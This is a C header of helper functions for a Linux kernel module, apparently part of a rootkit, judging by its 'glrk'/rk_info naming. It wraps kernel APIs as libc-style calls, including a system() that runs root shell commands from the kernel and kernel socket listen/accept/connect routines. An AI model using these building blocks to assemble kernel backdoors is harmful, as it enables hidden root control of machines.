#pragma once

#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/umh.h>
#include <linux/stddef.h>
#include <linux/fs.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <net/inet_connection_sock.h>
#include <net/request_sock.h>

long errno = 0;

#ifndef DEBUG
	#define DEBUG 1
#endif

#define KiB 1024
#define MiB 1024 * KiB

#define FIRST_ARG(regs, cast) (cast)regs->di
#define SECOND_ARG(regs, cast) (cast)regs->si
#define THIRD_ARG(regs, cast) (cast)regs->dx
#define FOURTH_ARG(regs, cast) (cast)regs->r10
#define FIFTH_ARG(regs, cast) (cast)regs->r8
#define SIXTH_ARG(regs, cast) (cast)regs->r9

#if DEBUG
	#define rk_info(...) pr_info("glrk: " __VA_ARGS__)
#else
	#define rk_info(...)
#endif

void sleep(unsigned int msecs) {
	msleep_interruptible(msecs);
}

#pragma GCC diagnostic ignored "-Wformat-zero-length"
struct task_struct* start_kthread(int (*func)(void*)) {
	return kthread_run(func, NULL, "");
}
#pragma GCC diagnostic warning "-Wformat-zero-length"

// This will do nothing if the thread itself doesnt return.
// It only signals to the thread that it should exit, which can be
// queried by the thread with kthread_should_stop()
int stop_kthread(struct task_struct* task) {
	return kthread_stop(task);
}

int execve(char* filename, char** argv, char** envp) {
	return call_usermodehelper(filename, argv, envp, UMH_WAIT_PROC);
}

int system_internal(char* command, int wait) {
	static char *envp[] = {
		"SHELL=/bin/sh",
		"HOME=/",
		"USER=root",
		"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin",
		"DISPLAY=:0",
		"PWD=/", 
		NULL,
	};

	char *argv[] = {
		"/bin/sh",
		"-c",
		command,
		NULL,
	};

	return call_usermodehelper("/bin/sh", argv, envp, wait);
}

void system_nowait(char* command) {
	(void)system_internal(command, UMH_WAIT_EXEC);
}

int system(char* command) {
	return system_internal(command, UMH_WAIT_PROC);
}

char* get_str_from_user(const char __user* string) {
	char* kernel_string;

	kernel_string = (char*)kmalloc(4096, GFP_KERNEL);
	if (!kernel_string)
		return NULL;

	if (strncpy_from_user(kernel_string, string, 4096) < 0) {
		kfree(kernel_string);
		return NULL;
	}

	return kernel_string;
}

struct file* open(char* path, int flags, umode_t mode) {
	struct file* file = filp_open(path, flags, mode);
	if (IS_ERR_VALUE(file)) {
		errno = (long)file;
		return NULL;
	}
	return file;
}

int close(struct file* file) {
	if (file)
		return filp_close(file, NULL);
	errno = -EBADFD;
	return -1;
}

ssize_t read(struct file* file, void* buf, size_t count) {
	if (file)
		return kernel_read(file, buf, count, NULL);
	errno = -EBADFD;
	return -1;
}

ssize_t write(struct file* file, void* buf, size_t count) {
	if (file)
		return kernel_write(file, buf, count, NULL);
	errno = -EBADFD;
	return -1;
}

struct socket* socket(int family, int type, int protocol) {
	struct socket* sock;
	int rc;

	rc = sock_create(family, type, protocol, &sock);
	if (rc < 0) {
		errno = rc;
		return NULL;
	}

	return sock;
}

int bind(struct socket* socket, struct sockaddr* addr, int addrlen) {
	int rc;

	if (socket && addr) {
		rc = kernel_bind(socket, addr, addrlen);
		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}

int listen(struct socket* socket, int backlog) {
	int rc;

	if (socket) {
		rc = kernel_listen(socket, backlog);
		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}

int connect(struct socket* socket, struct sockaddr* addr, int addrlen) {
	int rc;

	if (socket && addr) {
		rc = kernel_connect(socket, addr, addrlen, 0);
		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}

int release(struct socket* socket) {
	int rc;

	if (socket) {
		rc = socket->ops->release(socket);
		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}

struct socket* accept(struct socket* socket, int flags) {
	int rc;

	if (socket) {
		struct socket* retsock;
		rc = kernel_accept(socket, &retsock, flags);

		if (rc < 0) {
			errno = rc;
			return NULL;
		}

		return retsock;
	}

	errno = -EBADFD;
	return NULL;
}

int sendmsg(struct socket* socket, char* buf, int len) {
	int rc;
	struct msghdr msg;
	struct kvec iov[1];

	if (socket && buf) {
		iov[0].iov_base=buf;
		iov[0].iov_len=len;

		msg.msg_control=NULL;
		msg.msg_controllen=0;
		msg.msg_flags=0;
		msg.msg_name=0;
		msg.msg_namelen=0;

		rc = kernel_sendmsg(socket, &msg, iov, 1, iov[0].iov_len);

		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}

int recvmsg(struct socket* socket, char* buf, int len) {
	int rc;
	struct msghdr msg;
	struct kvec iov[1];

	if (socket && buf) {
		iov[0].iov_base=buf;
		iov[0].iov_len=len;

		msg.msg_control=NULL;
		msg.msg_controllen=0;
		msg.msg_flags=0;
		msg.msg_name=0;
		msg.msg_namelen=0;

		rc = kernel_recvmsg(socket, &msg, iov, 1, iov[0].iov_len, 0);

		if (rc < 0) {
			errno = rc;
			return -1;
		}

		return rc;
	}

	errno = -EBADFD;
	return -1;
}
